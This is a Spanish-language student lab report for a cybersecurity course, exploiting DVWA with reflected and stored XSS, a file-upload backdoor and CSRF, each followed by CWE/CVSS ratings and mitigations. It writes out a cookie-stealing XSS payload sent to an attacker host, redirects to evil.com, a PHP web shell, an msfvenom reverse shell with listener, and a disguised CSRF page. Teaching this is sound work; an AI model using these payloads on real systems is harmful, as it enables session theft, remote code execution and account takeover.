# INFORME #1 — Gestión de Vulnerabilidades en Aplicaciones
## DVWA: XSS Reflejado, XSS Almacenado, Upload Backdoor y CSRF

---

| Campo | Detalle |
|---|---|
| **Asignatura** | Gestión de Vulnerabilidades en Aplicaciones |
| **Programa** | Especialización en Ciberseguridad |
| **Docente** | Javier Mauricio Durán Vásquez |
| **Estudiante** | DANIEL ALEJANDRO AGUIRRE CEBALLOS |
| **Entorno de prueba** | Kali Linux + Metasploitable (DVWA) |
| **Fecha de entrega** | 28 de febrero de 2026 |
| **Guía** | No. 1 — Laboratorio práctico individual |

---

## Entorno de trabajo

- **Atacante:** Kali Linux — IP: `192.168.x.x` — Prompt: `[nombreapellido]@kali:~$`
- **Víctima:** Metasploitable con DVWA — IP: `192.168.x.x`
- **Nivel de seguridad DVWA:** Low
- **Herramientas utilizadas:** Burp Suite, navegador Firefox, Netcat, msfvenom, Weevely

---

## Vulnerabilidad 1 — XSS Reflejado (Cross-Site Scripting Reflected)

### 1. Descripción de la vulnerabilidad

El XSS Reflejado es una vulnerabilidad en la que el atacante inyecta código JavaScript malicioso en un parámetro de la solicitud HTTP (generalmente la URL o un campo de formulario)


### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

**b. Errores de lógica**

**c. Manejo inadecuado de entradas y salidas**


### 3. Mecanismo de ataque — Robo de cookie y secuestro de sesión

**Objetivo:** Robar la cookie de sesión de la víctima y cargarla en el navegador del atacante para iniciar sesión sin credenciales.

**Paso 1 — Levantar listener en Kali Linux**

Se inicia un servidor HTTP simple en el atacante para recibir la cookie exfiltrada:

```bash
[nombreapellido]@kali:~$ python3 -m http.server 8888
```

**Paso 2 — Construir el payload**

Se construye un script que lee la cookie de sesión del navegador de la víctima y la envía al servidor del atacante:

```javascript
<script>
  new Image().src = "http://192.168.X.ATACANTE:8888/?cookie=" + document.cookie;
</script>
```

URL maliciosa construida para XSS Reflejado en DVWA:

```
http://192.168.X.VICTIMA/dvwa/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.X.ATACANTE:8888/?cookie="+document.cookie;</script>
```

**Paso 3 — La víctima accede al enlace**

Cuando la víctima hace clic en el enlace, su navegador interpreta el script, lee el valor de `document.cookie` y realiza una petición GET al servidor del atacante incluyendo la cookie.

**Paso 4 — Recepción de la cookie**

En la terminal del atacante se observa la solicitud recibida:

```
[nombreapellido]@kali:~$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 ...
192.168.X.VICTIMA - - [27/Feb/2026] "GET /?cookie=PHPSESSID=abc123xyz456 HTTP/1.1" 200 -
```

**Paso 5 — Inyección de la cookie en el atacante**

En el navegador del atacante (Firefox), se abre la consola del desarrollador (`F12` → Consola) y se ejecuta:

```javascript
document.cookie = "PHPSESSID=abc123xyz456";
```

Luego se navega a `http://192.168.X.VICTIMA/dvwa/` y se obtiene acceso autenticado sin ingresar usuario ni contraseña.

> **📸 [CAPTURA 1]:** Vista de la URL maliciosa en el navegador.
> **📸 [CAPTURA 2]:** Terminal del atacante mostrando la cookie recibida (con fecha visible).
> **📸 [CAPTURA 3]:** DVWA con sesión iniciada desde el navegador del atacante usando la cookie robada.

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **OWASP Top 10** | A03:2021 – Injection |
| **CVSS v3 (base)** | 6.1 (Medium) — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Alto — Robo de cookies, tokens de autenticación y datos sensibles del DOM |
| **Integridad** | Medio — Modificación de contenido, phishing, redirecciones maliciosas |
| **Disponibilidad** | Bajo — No afecta directamente la disponibilidad del servicio |

### 6. Propuesta de mitigación

- **Codificación de salida:** Aplicar `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` en PHP antes de insertar cualquier dato del usuario en el HTML.
- **Content Security Policy (CSP):** Configurar `Content-Security-Policy: default-src 'self'` para bloquear scripts de orígenes externos.
- **Flags en cookies:** Configurar `HttpOnly` y `Secure` en las cookies de sesión para impedir su lectura desde JavaScript.
- **Sanitización con librerías:** Usar DOMPurify (JavaScript) o HTMLPurifier (PHP) para limpiar inputs antes de procesarlos.
- **Validación del lado del servidor:** Aplicar listas blancas de caracteres permitidos en todos los parámetros de entrada.

---
---

## Vulnerabilidad 2 — XSS Almacenado (Cross-Site Scripting Stored)

### 1. Descripción de la vulnerabilidad

El XSS Almacenado (o Persistente) es una variante del XSS en la que el payload malicioso es guardado permanentemente en la base de datos del servidor (campos de comentarios, mensajes, foros, perfiles).

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El código PHP de DVWA almacena directamente en la base de datos lo que el usuario escribe en los campos, sin sanitización:

**b. Errores de lógica**

**c. Manejo inadecuado de entradas y salidas**

### 3. Mecanismo de ataque — Redirección persistente

**Objetivo:** Inyectar en la sección de foros (XSS Stored) un payload que redirija automáticamente a todos los usuarios que accedan a esa funcionalidad hacia un sitio externo (`http://evil.com`).

**Paso 1 — Acceder a XSS (Stored) en DVWA**

Navegar a: `http://192.168.X.VICTIMA/dvwa/vulnerabilities/xss_s/`

**Paso 2 — Construir el payload de redirección**

En el campo **"Message"** se ingresa:

```html
<script>window.location.href='http://evil.com';</script>
```

En el campo **"Name"** se ingresa cualquier valor (ej: `Auditor`). Se hace clic en **"Sign Guestbook"**.

**Paso 3 — Verificar persistencia**

El payload queda almacenado en la base de datos. Cada vez que cualquier usuario (víctima) navegue a la sección XSS Stored, será redirigido automáticamente hacia `http://evil.com` sin posibilidad de interacción.

**Payload con iframe para carga silenciosa:**

```html
<script>
  document.location = "http://192.168.X.ATACANTE/phishing/login.html";
</script>
```

**Verificación en la base de datos (MySQL en Metasploitable):**

```sql
SELECT * FROM dvwa.guestbook;
-- Resultado: el campo comment contiene el script inyectado
```

> **📸 [CAPTURA 4]:** Formulario de XSS Stored con el payload ingresado.
> **📸 [CAPTURA 5]:** Comportamiento de redirección al recargar la página (con fecha visible).
> **📸 [CAPTURA 6]:** Registro en la base de datos con el payload almacenado.

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **CWE adicional** | CWE-116: Improper Encoding or Escaping of Output |
| **OWASP Top 10** | A03:2021 – Injection |
| **CVSS v3 (base)** | 8.8 (High) — Mayor impacto por persistencia y afectación masiva de usuarios |

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Alto — Keylogging, robo masivo de sesiones de todos los usuarios |
| **Integridad** | Alto — Modificación permanente del contenido, distribución de malware |
| **Disponibilidad** | Medio — Redirección masiva o degradación de la experiencia de usuario |

### 6. Propuesta de mitigación

- **Sanitización en almacenamiento:** Aplicar `strip_tags()` y `htmlspecialchars()` antes de insertar datos en la base de datos.
- **Sanitización en recuperación:** Codificar HTML al extraer datos para mostrarlos (`htmlentities()`).
- **Content Security Policy (CSP):** `script-src 'self'` para bloquear scripts inline y de terceros.
- **WAF con reglas OWASP CRS:** ModSecurity para detectar y bloquear payloads XSS en tiempo real.
- **Prepared Statements:** Separar datos de la lógica de consulta para evitar también SQLi asociado.

## Vulnerabilidad 3 — Upload Backdoor (File Upload Malicioso)

### 1. Descripción de la vulnerabilidad

La vulnerabilidad de subida de archivos maliciosos ocurre cuando una aplicación permite cargar archivos al servidor sin validar correctamente el tipo, extensión o contenido del archivo.
---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El código PHP vulnerable de DVWA únicamente verifica que se haya subido un archivo, sin validar la extensión real ni el tipo MIME:

**b. Errores de lógica**

La lógica del sistema asume que el usuario solo subirá imágenes legítimas, sin implementar ninguna restricción técnica que lo garantice.

**c. Manejo inadecuado de entradas y salidas**

El archivo sube con su nombre y extensión originales, sin renombrarlo ni verificar el número mágico (`magic bytes`) del archivo para confirmar que es una imagen real.

---

### 3. Mecanismo de ataque — Subida y ejecución de shell PHP

**Objetivo:** Subir un archivo PHP malicioso y explotarlo para obtener una shell reversa hacia Kali Linux.

**Paso 1 — Crear la web shell PHP**

En Kali Linux se crea el archivo backdoor:

```bash
[nombreapellido]@kali:~$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

O usando `msfvenom` para una reverse shell funcional:

```bash
[nombreapellido]@kali:~$ msfvenom -p php/reverse_php LHOST=192.168.X.ATACANTE LPORT=4444 -f raw > shell.php
```

**Paso 2 — Subir el archivo a DVWA**

Navegar a `http://192.168.X.VICTIMA/dvwa/vulnerabilities/upload/` y usar el formulario para subir `shell.php`. La aplicación acepta el archivo sin restricciones.

**Paso 3 — Iniciar listener en Kali**

```bash
[nombreapellido]@kali:~$ nc -lvnp 4444
```

O usando Metasploit:

```bash
[nombreapellido]@kali:~$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload php/reverse_php
msf6 exploit(multi/handler) > set LHOST 192.168.X.ATACANTE
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

**Paso 4 — Ejecutar el backdoor**

Navegar en el navegador a la ruta donde se subió el archivo:

```
http://192.168.X.VICTIMA/dvwa/hackable/uploads/shell.php
```

**Paso 5 — Sesión de consola obtenida**

El listener recibe la conexión reversa:

```bash
[nombreapellido]@kali:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.X.VICTIMA XXXX
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
cat /etc/passwd
```

La shell web también puede usarse para comandos directos por URL:

```
http://192.168.X.VICTIMA/dvwa/hackable/uploads/shell.php?cmd=whoami
```

> **📸 [CAPTURA 7]:** Formulario de upload con shell.php seleccionado.
> **📸 [CAPTURA 8]:** Mensaje de confirmación de subida exitosa (con fecha visible).
> **📸 [CAPTURA 9]:** Terminal Kali con la sesión reversa activa mostrando comandos ejecutados.

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **CWE adicional** | CWE-552: Files or Directories Accessible to External Parties |
| **OWASP Top 10** | A04:2021 – Insecure Design / A05:2021 – Security Misconfiguration |
| **CVSS v3 (base)** | 9.8 (Critical) — Ejecución remota de código sin autenticación previa |

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Crítico — Acceso completo al sistema de archivos, credenciales y bases de datos |
| **Integridad** | Crítico — Modificación de archivos del sistema, defacement, instalación de malware |
| **Disponibilidad** | Crítico — Apagado de servicios, instalación de ransomware, denegación de servicio |

### 6. Propuesta de mitigación

- **Validación de tipo MIME real:** Verificar los magic bytes del archivo, no solo la extensión o el tipo MIME declarado por el cliente.
- **Lista blanca de extensiones:** Permitir únicamente extensiones seguras (`.jpg`, `.png`, `.gif`).
- **Renombrar archivos:** Generar un nombre aleatorio al guardar el archivo, eliminando la extensión original.
- **Almacenamiento fuera del webroot:** Guardar archivos en un directorio no accesible directamente por URL.
- **Servir con Content-Disposition:** Forzar descarga en lugar de ejecución con `Content-Disposition: attachment`.
- **Limitar tamaño:** Restringir el tamaño máximo del archivo para evitar ataques DoS.

---

## Vulnerabilidad 4 — CSRF (Cross-Site Request Forgery)

### 1. Descripción de la vulnerabilidad

CSRF (Cross-Site Request Forgery o Falsificación de Peticiones en Sitios Cruzados) es un ataque en el que el atacante induce a una víctima autenticada a realizar una acción no deseada en una aplicación web en la que tiene sesión activa. El navegador de la víctima envía automáticamente las cookies de sesión con cada solicitud, por lo que la aplicación vulnerable cree que la petición es legítima aunque haya sido forjada por el atacante desde otro sitio.

---

### 2. Causas de la vulnerabilidad

**a. Ausencia de validaciones**

El código PHP de DVWA para cambio de contraseña no verifica ningún token CSRF ni valida el origen de la petición:

```php
// Código vulnerable (nivel Low) — Change Password
if( isset( $_GET[ 'Change' ] ) ) {
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    if( $pass_new == $pass_conf ) {
        $pass_new = md5( $pass_new );
        $insert = "UPDATE `users` SET password = '$pass_new'
                   WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $insert);
        echo "<pre>Password Changed.</pre>";
    }
}
```

**b. Errores de lógica**

La aplicación no exige que la petición provenga de una página del propio sitio, ni que el usuario haya iniciado explícitamente la acción.

**c. Manejo inadecuado de entradas y salidas**

Los parámetros sensibles (`password_new`, `password_conf`) viajan en la URL (método GET), lo que facilita la construcción de enlaces maliciosos y los registra en logs y cachés.

---

### 3. Mecanismo de ataque — Cambio de contraseña de la víctima

**Objetivo:** Falsificar una petición que cambie la contraseña del usuario víctima sin su conocimiento ni su interacción directa con el formulario.

**Paso 1 — Identificar la petición legítima**

Usando Burp Suite, se intercepta la petición de cambio de contraseña en DVWA:

```
GET /dvwa/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change HTTP/1.1
Host: 192.168.X.VICTIMA
Cookie: PHPSESSID=abc123xyz456; security=low
```

**Paso 2 — Construir la página de ataque**

El atacante crea un archivo HTML malicioso (`csrf_attack.html`) que, al cargarse en el navegador de la víctima, envía automáticamente la petición de cambio de contraseña:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Oferta Especial - Gana un iPhone!</title>
</head>
<body onload="document.forms[0].submit()">
  <form action="http://192.168.X.VICTIMA/dvwa/vulnerabilities/csrf/"
        method="GET"
        style="display:none;">
    <input type="hidden" name="password_new"  value="hackeado123" />
    <input type="hidden" name="password_conf" value="hackeado123" />
    <input type="hidden" name="Change"        value="Change" />
  </form>
  <h1>Cargando tu premio...</h1>
</body>
</html>
```

**Alternativa con imagen invisible (1x1 pixel):**

```html
<img src="http://192.168.X.VICTIMA/dvwa/vulnerabilities/csrf/?password_new=hackeado123&password_conf=hackeado123&Change=Change" width="1" height="1" />
```

**Paso 3 — Enviar el enlace a la víctima**

El atacante sirve el archivo malicioso desde su servidor:

```bash
[nombreapellido]@kali:~$ python3 -m http.server 80
```

Luego envía a la víctima un enlace hacia `http://192.168.X.ATACANTE/csrf_attack.html` mediante correo, chat o enlace embebido.

**Paso 4 — Ejecución silenciosa**

Cuando la víctima (con sesión activa en DVWA) abre el enlace, el navegador envía automáticamente la petición GET con sus cookies de sesión. El servidor cambia la contraseña a `hackeado123`.

**Paso 5 — Verificación**

El atacante intenta iniciar sesión en DVWA con `admin / hackeado123` y obtiene acceso exitoso.

> **📸 [CAPTURA 10]:** Archivo HTML malicioso y petición interceptada con Burp Suite.
> **📸 [CAPTURA 11]:** Respuesta del servidor confirmando el cambio de contraseña (con fecha visible).
> **📸 [CAPTURA 12]:** Login exitoso con la nueva contraseña establecida por el atacante.

---

### 4. Clasificación técnica

| Clasificación | Referencia |
|---|---|
| **CWE** | CWE-352: Cross-Site Request Forgery (CSRF) |
| **CWE adicional** | CWE-346: Origin Validation Error |
| **OWASP Top 10** | A01:2021 – Broken Access Control |
| **CVSS v3 (base)** | 8.8 (High) — Vector: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |

---

### 5. Impacto esperado en un sistema real

| Dimensión | Impacto |
|---|---|
| **Confidencialidad** | Alto — Acceso no autorizado a la cuenta de la víctima tras el cambio de credenciales |
| **Integridad** | Alto — Modificación de datos de la víctima (contraseñas, configuraciones, pedidos, transacciones) |
| **Disponibilidad** | Medio — Bloqueo de la cuenta legítima al cambiarle el acceso |

En aplicaciones bancarias o de comercio electrónico, CSRF puede usarse para realizar transferencias, compras o cambios de configuración crítica en nombre de la víctima, con consecuencias económicas directas.

---

### 6. Propuesta de mitigación

- **Token CSRF (Synchronizer Token Pattern):** Generar un token único, secreto e impredecible por sesión y validarlo en cada petición de cambio de estado del servidor.
- **SameSite Cookie Attribute:** Configurar las cookies con `SameSite=Strict` o `SameSite=Lax` para que no se envíen en solicitudes de origen cruzado.
- **Verificación del encabezado `Origin/Referer`:** Validar que la solicitud provenga del mismo dominio de la aplicación.
- **Re-autenticación para acciones críticas:** Solicitar la contraseña actual antes de permitir cambiarla.
- **Método POST para operaciones sensibles:** Evitar operaciones de cambio de estado mediante GET, ya que estas son trivialmente explotables con imágenes o iframes.
- **Double Submit Cookie:** Enviar el token CSRF tanto en la cookie como en un parámetro oculto del formulario.

---
---

## Reflexión Personal

Durante el desarrollo de este laboratorio, asumiendo el rol de auditor de seguridad y pentester ético sobre la plataforma DVWA, se evidenció de manera práctica cómo vulnerabilidades aparentemente simples en el código de una aplicación web pueden derivar en compromisos críticos de la seguridad de un sistema real.

La experiencia más reveladora fue comprender que ninguna de las cuatro vulnerabilidades trabajadas requiere sofisticación técnica extrema para ser explotada: todas aprovechan errores fundamentales de diseño que podrían prevenirse con prácticas básicas de programación segura. El **XSS Reflejado** y el **XSS Almacenado** se originan en la misma causa raíz: confiar en el input del usuario sin codificación de salida; sin embargo, el impacto del XSS Almacenado es significativamente mayor por su persistencia y escala.

El laboratorio de **Upload Backdoor** fue el de mayor impacto tangible, ya que en cuestión de minutos se obtuvo ejecución remota de comandos sobre el servidor víctima, lo que en un entorno productivo implicaría el compromiso total del sistema. Esto refuerza la necesidad crítica de validar los archivos subidos por usuarios en cualquier plataforma web.

El ataque **CSRF** resultó ser el más "silencioso" de todos: la víctima no percibe ninguna señal de alerta, no requiere que el atacante interactúe directamente con la aplicación y explota la confianza implícita que el navegador deposita en las cookies de sesión. Su mitigación con tokens CSRF es sencilla pero frecuentemente omitida en desarrollos ágiles.

En términos de aplicabilidad profesional, estas prácticas refuerzan la importancia de integrar la seguridad desde las etapas tempranas del ciclo de desarrollo de software (DevSecOps), realizar pruebas de penetración periódicas y educar a los equipos de desarrollo en los principios de OWASP. Un auditor de seguridad que comprende la mecánica de estos ataques está mejor preparado para proponer controles preventivos eficaces y defender aplicaciones web en entornos reales.

---

## Referencias

1. OWASP Foundation. (2021). *OWASP Top Ten 2021*. https://owasp.org/www-project-top-ten/
2. MITRE Corporation. (2024). *CWE-79: Cross-site Scripting*. https://cwe.mitre.org/data/definitions/79.html
3. MITRE Corporation. (2024). *CWE-352: Cross-Site Request Forgery*. https://cwe.mitre.org/data/definitions/352.html
4. MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
5. PortSwigger. (2024). *Web Security Academy — XSS*. https://portswigger.net/web-security/cross-site-scripting
6. PortSwigger. (2024). *Web Security Academy — CSRF*. https://portswigger.net/web-security/csrf
7. Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook*. Wiley.
8. Durán Vásquez, J. M. (2026). *Guía de Trabajo Práctico No. 1 — Gestión de Vulnerabilidades en Aplicaciones*. ITM.

---

> ⚠️ **Nota:** Las capturas de pantalla (indicadas como `📸 [CAPTURA N]`) deben ser reemplazadas con las capturas reales obtenidas durante la práctica, mostrando la fecha del sistema visible y el prompt personalizado `[nombreapellido]@kali:~$` según los requisitos de la guía.

---
*Informe generado el 27/02/2026 — Entrega: 28/02/2026*
